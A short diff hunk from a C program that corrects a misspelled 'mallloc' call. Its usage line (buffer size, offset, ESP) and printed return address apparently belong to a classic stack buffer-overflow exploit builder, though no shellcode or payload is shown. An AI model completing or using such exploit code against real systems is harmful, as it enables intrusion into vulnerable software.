@@ -25,7 +25,7 @@ int main(int argc,char *argv[1]) {
   fprintf(stderr,"Usage:%s<buff_size><offset><esp:0xfff...>\n",argv[0]);
   fprintf(stderr,"ESP:0x%x Offset:0x%x Return:0x%x\n",esp,offset,ret);
   
-  buffer = (char *)mallloc(size);
+  buffer = (char *)malloc(size);
   
   ptr = buffer;
   addr_ptr = (unsigned int *) ptr;
